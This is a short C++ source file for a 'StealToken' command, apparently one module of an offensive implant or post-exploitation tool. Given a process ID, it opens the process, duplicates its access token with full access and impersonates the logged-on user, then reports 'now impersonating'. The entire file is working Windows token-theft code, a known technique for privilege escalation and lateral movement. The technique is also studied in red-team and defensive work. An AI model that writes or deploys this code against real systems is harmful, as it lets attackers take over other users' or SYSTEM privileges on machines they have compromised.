#include "StealToken.h"
#include <sstream>

std::string StealToken(std::vector<std::string> arguments) {
    if (arguments.empty() || arguments[0].empty())
        return "Error: PID required";

    DWORD pid = 0;
    try {
        pid = static_cast<DWORD>(std::stoul(arguments[0]));
    } catch (...) {
        return "Error: invalid PID";
    }

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProcess)
        return "Error: OpenProcess failed (code " + std::to_string(GetLastError()) + ")";

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        CloseHandle(hProcess);
        return "Error: OpenProcessToken failed (code " + std::to_string(GetLastError()) + ")";
    }
    CloseHandle(hProcess);

    HANDLE hDupToken = NULL;
    BOOL ok = DuplicateTokenEx(
        hToken,
        TOKEN_ALL_ACCESS,
        NULL,
        SecurityImpersonation,
        TokenImpersonation,
        &hDupToken
    );
    CloseHandle(hToken);

    if (!ok)
        return "Error: DuplicateTokenEx failed (code " + std::to_string(GetLastError()) + ")";

    ok = ImpersonateLoggedOnUser(hDupToken);
    CloseHandle(hDupToken);

    if (!ok)
        return "Error: ImpersonateLoggedOnUser failed (code " + std::to_string(GetLastError()) + ")";

    return "Stolen token from PID " + std::to_string(pid) + " — now impersonating";
}
